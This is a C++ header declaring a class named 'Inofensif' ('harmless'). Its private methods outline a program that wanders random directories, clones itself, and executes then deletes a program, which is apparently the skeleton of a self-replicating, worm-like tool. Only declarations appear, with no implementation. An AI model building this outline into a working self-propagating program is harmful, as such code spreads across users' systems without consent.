#pragma once

#include <filesystem>
#include <vector>

enum class Movement { Avance, Recule, Immobile };

class Inofensif
{
private:
	#ifdef DEBUG
	static constexpr bool debug = true;
	#else
	static constexpr bool debug = false;
	#endif

	std::filesystem::path			position;
	Movement				movement;
	std::vector<std::filesystem::path>	vector_path;
	std::filesystem::path			dir_target;
	std::filesystem::path			to_execute;
	std::filesystem::path			clone_path;

	Movement				choisirMovementAleatoire(void);
	std::filesystem::path			choisirRepertoireAleatoire(void);
	void					list_directory_to_vector_path(const std::filesystem::path& where);
	std::filesystem::path			get_dir_target(void);
	void					announce(void);
	void					clone_itself(void);
	void					execute_and_delete_program(void);

public:
	Inofensif(void);
};

